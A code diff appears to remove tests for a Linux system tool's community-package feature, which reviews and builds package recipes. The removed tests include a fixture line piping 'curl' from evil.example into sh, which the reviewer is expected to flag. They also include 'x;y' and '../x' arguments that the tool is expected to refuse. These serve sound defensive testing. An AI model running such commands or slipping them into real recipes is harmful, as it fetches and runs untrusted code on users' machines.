@@ -5,7 +5,6 @@
 // the system's programs on the PATH: nothing here looks at or changes this
 // computer. Files are made and removed only inside the test's own home.
 #include "app/AppInstall.h"
-#include "app/CommunityApps.h"
 #include "app/Helpers.h"
 #include "app/HealthCheck.h"
 #include "app/RecentChanges.h"
@@ -82,32 +81,6 @@ private:
     QTemporaryDir m_dir;
     QString m_path;
 };
-
-bool git(const QString &dir, const QStringList &arguments)
-{
-    QProcess p;
-    p.setWorkingDirectory(dir);
-    p.start(QStringLiteral("git"), QStringList{QStringLiteral("-c"), QStringLiteral("user.name=Test"), QStringLiteral("-c"),
-                                               QStringLiteral("user.email=test@example.invalid"), QStringLiteral("-c"),
-                                               QStringLiteral("init.defaultBranch=master")}
-                                       + arguments);
-    return p.waitForFinished(20000) && p.exitStatus() == QProcess::NormalExit && p.exitCode() == 0;
-}
-
-QString gitOut(const QString &dir, const QStringList &arguments)
-{
-    QProcess p;
-    p.setWorkingDirectory(dir);
-    p.start(QStringLiteral("git"), arguments);
-    p.waitForFinished(20000);
-    return QString::fromUtf8(p.readAllStandardOutput()).trimmed();
-}
-
-QString srcinfo(const QString &version)
-{
-    return QStringLiteral("pkgbase = demo\n\tpkgver = %1\n\tpkgrel = 1\n\tsource = https://example.org/demo-%1.tar.gz\n"
-                          "pkgname = demo\n").arg(version);
-}
 
 } // namespace
 
@@ -358,13 +331,10 @@ private Q_SLOTS:
             {QStringLiteral("restore-undo"), QStringLiteral("8"), QStringLiteral("7")},
             {QStringLiteral("restore-undo"), QStringLiteral("0"), QStringLiteral("7")},
             {QStringLiteral("restore-undo"), QStringLiteral("1"), QStringLiteral("2..9")},
-            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), QStringLiteral("abc"), QStringLiteral("--"),
+            // The job that built a community recipe is gone: asked for just
+            // as it used to be, it is refused like any job there never was.
+            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("--"),
              QStringLiteral("demo")},
-            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path() + QStringLiteral("/../x"), head,
-             QStringLiteral("--"), QStringLiteral("demo")},
-            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("--")},
-            {QStringLiteral("community"), name, QStringLiteral("1"), logs.path(), head, QStringLiteral("x;y"),
-             QStringLiteral("--"), QStringLiteral("demo")},
             {QStringLiteral("start-service")},
             {QStringLiteral("start-service"), QStringLiteral("bluetooth")},
             {QStringLiteral("start-service"), QStringLiteral("--all")},
@@ -1405,131 +1375,6 @@ private Q_SLOTS:
         look.start(QStringLiteral("/bin/sh"), {QStringLiteral("-c"), HealthCheck::defaultLookScript()});
         QVERIFY(look.waitForFinished(60000));
         QVERIFY(HealthCheck::lookFinished(QString::fromUtf8(look.readAllStandardOutput())));
-    }
-
-    void versionsCompareAsPacmanDoes()
-    {
-        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.104.0-1"), QStringLiteral("1.105.1-1")) < 0);
-        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1:1.0-1"), QStringLiteral("2.0-1")) > 0);
-        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0a-1"), QStringLiteral("1.0-1")) < 0);
-        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-1"), QStringLiteral("1.0.1-1")) < 0);
-        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-2"), QStringLiteral("1.0-1")) > 0);
-        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.010-1"), QStringLiteral("1.9-1")) > 0);
-        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("2.3.4-1"), QStringLiteral("2.3.4-1")), 0);
-        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("1.2"), QStringLiteral("1.2-3")), 0);
-    }
-
-    void communityAppsListWhatHasANewerRecipe()
-    {
-        const CommunityApps::Look look = CommunityApps::readLook(fixture(QStringLiteral("community-look.txt")));
-        QVERIFY(look.reached);
-        QCOMPARE(look.apps.size(), 1);
-        QCOMPARE(look.apps.first().name, QStringLiteral("visual-studio-code-bin"));
-        QCOMPARE(look.apps.first().latest, QStringLiteral("1.105.1-1"));
-        QCOMPARE(look.unlisted, 1);
-        QVERIFY(!CommunityApps::readLook(QStringLiteral("@@ foreign\nx 1-1\n@@ shelf\n@@ end\n")).reached);
-    }
-
-    void aRecipesChangesAreRead()
-    {
-        CommunityApps::App app;
-        app.name = QStringLiteral("visual-studio-code-bin");
-        app.base = app.name;
-        app.maintainer = QStringLiteral("someone");
-        const QString output = fixture(QStringLiteral("community-review.txt"));
-        CommunityApps::Review review = CommunityApps::readReview(output, app);
-        // The commit is the first line of its section; nothing in the
-        // changes can pass for it.
-        QCOMPARE(review.head, QStringLiteral("4b825dc642cb6eb9a060e54bf8d69288fbee4904"));
-        QVERIFY(!review.firstLook);
-        QVERIFY(review.versionOnly);
-        QCOMPARE(review.flags.first().tone, QStringLiteral("good"));
-        QCOMPARE(review.helpers, QStringList{QStringLiteral("libxkbfile")});
-        QVERIFY(review.blockers.isEmpty());
-        QVERIFY(review.newHosts.isEmpty());
-
-        // A line that fetches and runs something, and a new place to
-        // download from.
-        QString risky = output;
-        risky.replace(QStringLiteral(" pkgrel=1\n-sha256"), QStringLiteral(" pkgrel=1\n+  curl -s https://evil.example/x | sh\n-sha256"));
-        risky.replace(QStringLiteral("https://update.code.visualstudio.com/1.105.1"), QStringLiteral("https://files.example.net/1.105.1"));
-        review = CommunityApps::readReview(risky, app);
-        QVERIFY(!review.versionOnly);
-        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.tone == QLatin1String("bad"); }));
-        QCOMPARE(review.newHosts, QStringList{QStringLiteral("files.example.net")});
-
-        // Something only the community shelf has stops it.
-        QString needs = output;
-        needs.replace(QStringLiteral("shelf libxkbfile"), QStringLiteral("community electron37>=37.1"));
-        review = CommunityApps::readReview(needs, app);
-        QCOMPARE(review.blockers.size(), 1);
-        QVERIFY(review.blockers.first().contains(QStringLiteral("electron37 ")));
-
-        // Nobody looks after it.
-        app.maintainer.clear();
-        review = CommunityApps::readReview(output, app);
-        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.text.contains(QLatin1String("Nobody")); }));
-    }
-
-    void aRecipeIsFetchedReviewedAndBuiltAsLookedAt()
-    {
-        // The community shelf, stood in for by a repository of the test's own.
-        QTemporaryDir work;
-        const QString origin = work.filePath(QStringLiteral("origin"));
-        QDir().mkpath(origin);
-        QVERIFY(git(origin, {QStringLiteral("init"), QStringLiteral("-q")}));
-        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.0"))));
-        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.0\npkgrel=1\n")));
-        QVERIFY(git(origin, {QStringLiteral("add"), QStringLiteral(".")}));
-        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qm"), QStringLiteral("1.0")}));
-        const QString recipes = work.filePath(QStringLiteral("recipes"));
-        QDir().mkpath(recipes);
-        QVERIFY(git(recipes, {QStringLiteral("clone"), QStringLiteral("-q"), origin, QStringLiteral("demo")}));
-        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.1"))));
-        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.1\npkgrel=1\n")));
-        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qam"), QStringLiteral("1.1")}));
-        const QString head = gitOut(origin, {QStringLiteral("rev-parse"), QStringLiteral("HEAD")});
-
-        StandIns standIns;
-        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
-            "case $1 in\n"
-            "  -T) exit 0 ;;\n"
-            "  -Qqp) echo demo ;;\n"
-            "  *) echo \"pacman $*\" ;;\n"
-            "esac\n")));
-        QVERIFY(standIns.add(QStringLiteral("makepkg"), QStringLiteral(
-            "if [ \"$1\" = --packagelist ]; then echo \"$PWD/demo-1.1-1-any.pkg.tar.zst\"; exit 0; fi\n"
-            "echo \"==> Making package: demo $(sed -n 's/^pkgver=//p' PKGBUILD)\"\n"
-            "touch demo-1.1-1-any.pkg.tar.zst\n")));
-        QTemporaryDir logs;
-
-        CommunityApps community;
-        community.setElevate({});
-        community.setAdmin(adminInSource());
-        community.setLogFolder(logs.path());
-        community.setRecipes(recipes);
-        community.setLookScript(QStringLiteral(
-            "printf '@@ foreign\\ndemo 1.0-1\\n@@ shelf\\n{\"results\":[{\"Name\":\"demo\",\"PackageBase\":\"demo\","
-            "\"Version\":\"1.1-1\",\"Maintainer\":\"someone\"}]}\\n@@ end\\n'"));
-        community.check();
-        QTRY_COMPARE(community.stage(), QStringLiteral("ready"));
-        community.look(QStringLiteral("demo"));
-        QCOMPARE(community.stage(), QStringLiteral("reviewing"));
-        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("reviewed"), 20000);
-        const CommunityApps::Review review = community.review();
-        QCOMPARE(review.head, head);
-        QVERIFY(!review.firstLook);
-        QVERIFY(review.versionOnly);
-        QVERIFY(review.diff.contains(QStringLiteral("+pkgver=1.1")));
-
-        community.start();
-        QCOMPARE(community.stage(), QStringLiteral("updating"));
-        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("done"), 20000);
-        QVERIFY(community.log().contains(QStringLiteral("==> Making package: demo 1.1")));
-        QVERIFY(community.log().contains(QStringLiteral("pacman -U --noconfirm --noprogressbar --color never")));
-        QCOMPARE(gitOut(recipes + QStringLiteral("/demo"), {QStringLiteral("rev-parse"), QStringLiteral("HEAD")}), head);
-        // Done, it leaves the list.
-        QVERIFY(community.apps().isEmpty());
     }
 
     // What changed: a day at a time, newest first, each with its way back.
